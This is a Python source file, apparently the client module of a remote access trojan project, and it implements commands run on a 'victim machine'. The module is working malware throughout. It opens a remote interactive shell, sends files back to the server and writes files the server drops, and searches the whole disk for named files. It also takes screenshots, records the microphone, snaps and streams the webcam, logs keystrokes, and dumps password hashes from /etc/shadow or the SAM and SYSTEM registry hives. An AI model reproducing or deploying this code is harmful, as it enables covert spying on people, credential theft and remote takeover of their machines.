"""
Actions executed on the victim machine (RAT client).

Each function corresponds to a command available in the RAT.
This file is imported by client_app.py which routes commands
received from the server to the right function.

Compatibility: Windows and Linux.
"""

import base64
import io
import locale
import platform
import socket
import subprocess
import wave
from pathlib import Path

import sounddevice

from rat_project.common.protocol import decode_message, encode_message
from rat_project.utils.logger_config import setup_logger

logger = setup_logger("client.actions")

# ---------------------------------------------------------------------------
# Keylogger state
# ---------------------------------------------------------------------------

_keylogger_listener = None  # pynput Listener instance, or None if not running
_keylogger_buffer: list[str] = []


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _get_os() -> str:
    """Returns the operating system name ('Windows' or 'Linux')."""
    return platform.system()


def _run_command(command: str) -> str:
    """
    Runs a shell command and returns the output as text.
    Automatically handles encoding depending on the OS (cp850 on Windows).

    Args:
        command: Shell command to execute.

    Returns:
        str: Command output (stdout or stderr).
    """
    os_name = _get_os()
    encoding = "cp850" if os_name == "Windows" else locale.getpreferredencoding(False)

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        encoding=encoding,
        errors="replace",
        check=False,
    )
    return result.stdout.strip() or result.stderr.strip() or "No output"


# ---------------------------------------------------------------------------
# ipconfig — network configuration
# ---------------------------------------------------------------------------


def get_ipconfig() -> str:
    """
    Returns the network configuration of the machine.

    - Windows : runs 'ipconfig /all'
    - Linux   : runs 'ip addr'

    Returns:
        str: Network command output.
    """
    os_name = _get_os()
    command = "ipconfig /all" if os_name == "Windows" else "ip addr"
    logger.info("ipconfig: running '%s'", command)
    return _run_command(command)


# ---------------------------------------------------------------------------
# sysinfo — system information
# ---------------------------------------------------------------------------


def get_system_info() -> str:
    """
    Returns system information.

    - Windows : runs 'systeminfo'
    - Linux   : runs 'uname -a'

    Returns:
        str: System command output.
    """
    os_name = _get_os()
    command = "systeminfo" if os_name == "Windows" else "uname -a"
    logger.info("sysinfo: running '%s'", command)
    return _run_command(command)


# ---------------------------------------------------------------------------
# screenshot — screen capture
# ---------------------------------------------------------------------------


def take_screenshot() -> str:
    """
    Takes a screenshot of the victim machine.

    Uses Pillow (PIL.ImageGrab) to capture the full screen,
    then encodes the result in base64 for the JSON protocol.

    Returns:
        str: Base64-encoded JPEG image, or empty string on failure.
    """
    try:
        from PIL import ImageGrab

        img = ImageGrab.grab()
        buffer = io.BytesIO()
        img.save(buffer, format="JPEG")
        encoded = base64.b64encode(buffer.getvalue()).decode("utf-8")
        logger.info("Screenshot taken (%d bytes)", len(buffer.getvalue()))
        return encoded

    except Exception as exc:
        logger.exception("Screenshot error: %s", exc)
        return ""


# ---------------------------------------------------------------------------
# shell — interactive shell
# ---------------------------------------------------------------------------


def handle_shell(conn: socket.socket) -> None:
    """
    Opens an interactive shell with the server.

    Waits for 'shell_input' messages from the server,
    executes each command, and sends back the result.
    Stops when the server sends 'shell_stop'.

    Args:
        conn: TLS socket connected to the server.
    """
    os_name = _get_os()
    encoding = "cp850" if os_name == "Windows" else locale.getpreferredencoding(False)
    logger.info("Interactive shell opened (OS: %s)", os_name)

    while True:
        try:
            data = conn.recv(65536)
            if not data:
                break

            message = decode_message(data.decode("utf-8").strip())

            # Stop requested by the server
            if message.get("command") == "shell_stop":
                logger.info("Shell: stop requested by server")
                break

            # Execute a shell command
            if message.get("type") == "shell_input":
                cmd = message.get("input", "")
                logger.info("Shell: running '%s'", cmd)

                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding=encoding,
                    errors="replace",
                    check=False,
                )
                output = result.stdout + result.stderr
                conn.sendall(encode_message({"type": "shell_output", "output": output}))

        except Exception as exc:
            logger.exception("Interactive shell error: %s", exc)
            break


# ---------------------------------------------------------------------------
# download — send a file from the victim to the server
# ---------------------------------------------------------------------------


def handle_download(remote_path: str) -> dict:
    """
    Reads a file on the victim machine and encodes it in base64
    to send it to the server.

    The server requested this file via the 'download <path>' command.
    Content is base64-encoded because the protocol is JSON (text).

    Args:
        remote_path: Absolute or relative path of the file on the victim.

    Returns:
        dict: Response with base64-encoded content, or an error.
    """
    path = Path(remote_path)

    # Check that the file exists
    if not path.exists():
        logger.warning("Download requested but file not found: %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"File not found: {remote_path}",
        }

    # Check that it is a file (not a directory)
    if not path.is_file():
        logger.warning("Download requested but path is not a file: %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Path is not a file: {remote_path}",
        }

    try:
        # Binary read + base64 encoding to fit in JSON
        file_bytes = path.read_bytes()
        encoded = base64.b64encode(file_bytes).decode("utf-8")

        logger.info("Download: %s (%s bytes)", remote_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "download",
            "filename": path.name,
            "data": encoded,
            "output": f"File sent: {path.name} ({len(file_bytes)} bytes)",
        }

    except PermissionError:
        logger.warning("Download denied (permissions): %s", remote_path)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Permission denied: {remote_path}",
        }

    except Exception as exc:
        logger.exception("Download error for %s: %s", remote_path, exc)
        return {
            "type": "command_result",
            "command": "download",
            "error": f"Error: {exc}",
        }


# ---------------------------------------------------------------------------
# upload — receive a file sent by the server
# ---------------------------------------------------------------------------


def handle_upload(message: dict) -> dict:
    """
    Receives a file sent by the server and writes it on the victim.

    The server encoded the file in base64 in the message.
    We decode it and write it to the agent's current directory.

    Args:
        message: Server message containing 'filename' and 'data' (base64).

    Returns:
        dict: Write confirmation or error message.
    """
    filename = message.get("filename", "uploaded_file")
    encoded_data = message.get("data", "")

    if not encoded_data:
        logger.warning("Upload received but no data in message")
        return {
            "type": "command_result",
            "command": "upload",
            "error": "No data received.",
        }

    try:
        # base64 decode → bytes → write to disk
        file_bytes = base64.b64decode(encoded_data)
        save_path = Path(filename)
        save_path.write_bytes(file_bytes)

        logger.info("Upload received and saved: %s (%s bytes)", save_path, len(file_bytes))

        return {
            "type": "command_result",
            "command": "upload",
            "output": f"File received and saved: {save_path} ({len(file_bytes)} bytes)",
        }

    except Exception as exc:
        logger.exception("Upload error for %s: %s", filename, exc)
        return {
            "type": "command_result",
            "command": "upload",
            "error": f"Error: {exc}",
        }


# ---------------------------------------------------------------------------
# search — search for a file on the victim machine
# ---------------------------------------------------------------------------


def search_file(filename: str) -> str:
    """
    Searches for a file by name across the entire victim machine.

    Args:
        filename: Name of the file to search for (e.g. "passwords.txt").

    Returns:
        str: List of found paths, or a message if no results.
    """
    results = []

    # Recursive search from the root
    root = Path("C:/") if _get_os() == "Windows" else Path("/")

    for path in root.rglob(filename):
        try:
            results.append(str(path))
        except PermissionError:
            continue

    if not results:
        return f"No file found for: {filename}"

    return "\n".join(results)


# ---------------------------------------------------------------------------
# record_audio — microphone recording
# ---------------------------------------------------------------------------

AUDIO_SAMPLE_RATE = 44100  # Hz (CD quality)
AUDIO_CHANNELS = 1  # mono


def record_audio(duration: int = 5) -> str:
    """
    Records audio from the victim's microphone and returns a base64 WAV string.

    Uses sounddevice to capture int16 PCM, then wraps it in a WAV
    container (stdlib wave module) and encodes it in base64 for JSON transport.

    Args:
        duration: Recording duration in seconds (default: 5).

    Returns:
        str: Base64-encoded WAV audio data.
    """
    logger.info("Recording audio for %s second(s)...", duration)

    # 1. Capture from the default microphone as 16-bit PCM
    frames = sounddevice.rec(
        int(duration * AUDIO_SAMPLE_RATE),
        samplerate=AUDIO_SAMPLE_RATE,
        channels=AUDIO_CHANNELS,
        dtype="int16",
    )
    sounddevice.wait()  # block until recording is complete

    logger.info("Recording finished (%s frames captured)", len(frames))

    # 2. Write in-memory into a WAV container (no temp file)
    wav_buffer = io.BytesIO()
    with wave.open(wav_buffer, "wb") as wav_file:
        wav_file.setnchannels(AUDIO_CHANNELS)
        wav_file.setsampwidth(2)  # 2 bytes = 16 bits per sample
        wav_file.setframerate(AUDIO_SAMPLE_RATE)
        wav_file.writeframes(frames.tobytes())

    # 3. base64 encode for JSON transport
    return base64.b64encode(wav_buffer.getvalue()).decode("utf-8")


# ---------------------------------------------------------------------------
# webcam_snapshot — capture a photo from the webcam
# ---------------------------------------------------------------------------


def webcam_snapshot() -> str:
    """
    Captures a photo from the victim's webcam.

    Opens the default camera (index 0), reads one frame,
    encodes it as JPEG, then returns the result in base64
    for the JSON protocol.

    Returns:
        str: Base64-encoded JPEG image, or empty string on failure.
    """
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        logger.warning("webcam_snapshot: no webcam available (index 0)")
        return ""

    try:
        success, frame = cam.read()
        if not success:
            logger.warning("webcam_snapshot: failed to read frame")
            return ""

        _, buffer = cv2.imencode(".jpg", frame)
        encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
        logger.info("webcam_snapshot: frame captured (%d bytes)", len(buffer))
        return encoded

    except Exception as exc:
        logger.exception("webcam_snapshot error: %s", exc)
        return ""

    finally:
        cam.release()


# ---------------------------------------------------------------------------
# webcam_stream — live video stream
# ---------------------------------------------------------------------------


def webcam_stream(conn: socket.socket) -> None:
    """
    Streams live webcam frames to the server.

    Each frame is sent as {"type": "stream_frame", "data": "<base64 JPEG>"}.
    The loop stops when the server sends {"type": "stream_stop"} or on error.

    Args:
        conn: TLS socket connected to the server.
    """
    import cv2

    cam = cv2.VideoCapture(0)
    if not cam.isOpened():
        logger.warning("webcam_stream: no webcam available (index 0)")
        conn.sendall(encode_message({"type": "stream_error", "error": "No webcam available"}))
        return

    conn.settimeout(0.05)  # short timeout to check stop signal between frames

    try:
        while True:
            success, frame = cam.read()
            if not success:
                logger.warning("webcam_stream: failed to read frame")
                break

            # JPEG encode then base64 (same logic as webcam_snapshot)
            _, buffer = cv2.imencode(".jpg", frame)
            encoded = base64.b64encode(buffer.tobytes()).decode("utf-8")
            conn.sendall(encode_message({"type": "stream_frame", "data": encoded}))

            # Non-blocking check for stop signal
            try:
                raw = conn.recv(4096)
                if raw:
                    msg = decode_message(raw.decode("utf-8").strip())
                    if msg.get("type") == "stream_stop":
                        break
            except TimeoutError:
                pass  # no stop signal yet, keep streaming

    except Exception as exc:
        logger.exception("webcam_stream error: %s", exc)

    finally:
        cam.release()
        conn.settimeout(None)  # restore blocking mode
        logger.info("webcam_stream: stopped")


# ---------------------------------------------------------------------------
# keylogger — keystroke recording
# ---------------------------------------------------------------------------


def toggle_keylogger() -> str:
    """
    Starts or stops the keylogger.

    - First call  : starts a background listener, returns a confirmation.
    - Second call : stops the listener, returns all captured keystrokes.

    Uses pynput.keyboard.Listener which runs in a separate thread.

    Returns:
        str: Status message, or captured keystrokes on stop.
    """
    from pynput import keyboard

    global _keylogger_listener, _keylogger_buffer

    # --- Stop ---
    if _keylogger_listener is not None:
        _keylogger_listener.stop()
        _keylogger_listener = None
        captured = "".join(_keylogger_buffer)
        _keylogger_buffer = []
        logger.info("Keylogger stopped. %d chars captured.", len(captured))
        return f"Keylogger stopped.\nCaptured keystrokes:\n{captured}"

    # --- Start ---
    def on_press(key: keyboard.Key) -> None:
        try:
            _keylogger_buffer.append(key.char)
        except AttributeError:
            # Special keys (Enter, Shift, etc.)
            _keylogger_buffer.append(f"[{key.name}]")

    _keylogger_listener = keyboard.Listener(on_press=on_press)
    _keylogger_listener.start()
    logger.info("Keylogger started.")
    return "Keylogger started."


# ---------------------------------------------------------------------------
# hashdump — password hash retrieval
# ---------------------------------------------------------------------------


def hashdump() -> str:
    """
    Retrieves password hashes depending on the OS.

    - Linux   : reads /etc/shadow (requires root privileges)
    - Windows : saves SAM and SYSTEM hives via reg.exe
                (requires Administrator privileges)

    Returns:
        str: Shadow file content, hive paths, or an error message.
    """
    import tempfile

    os_name = _get_os()

    if os_name == "Linux":
        shadow_path = Path("/etc/shadow")
        try:
            content = shadow_path.read_text(encoding="utf-8")
            logger.info("hashdump Linux: %d lines retrieved", content.count("\n"))
            return content
        except PermissionError:
            logger.warning("hashdump: permission denied for %s (root required)", shadow_path)
            return f"Error: permission denied to read {shadow_path} (root required)"
        except FileNotFoundError:
            return f"Error: {shadow_path} not found"
        except Exception as exc:
            logger.exception("hashdump Linux error: %s", exc)
            return f"Error: {exc}"

    elif os_name == "Windows":
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                sam_path = str(Path(tmpdir) / "SAM")
                system_path = str(Path(tmpdir) / "SYSTEM")

                # Save registry hives
                for hive, dest in [("HKLM\\SAM", sam_path), ("HKLM\\SYSTEM", system_path)]:
                    result = subprocess.run(
                        ["reg", "save", hive, dest, "/y"],
                        capture_output=True,
                        text=True,
                        check=False,
                    )
                    if result.returncode != 0:
                        logger.warning("hashdump Windows error on %s: %s", hive, result.stderr.strip())
                        return f"Error saving {hive}: {result.stderr.strip()}"

                logger.info("hashdump Windows: SAM and SYSTEM hives saved")
                return (
                    f"Hives saved:\n"
                    f"  SAM    -> {sam_path}\n"
                    f"  SYSTEM -> {system_path}\n"
                    "(Binary files — use secretsdump or impacket to extract hashes)"
                )
        except Exception as exc:
            logger.exception("hashdump Windows error: %s", exc)
            return f"Error: {exc}"

    else:
        return f"Unsupported OS for hashdump: {os_name}"
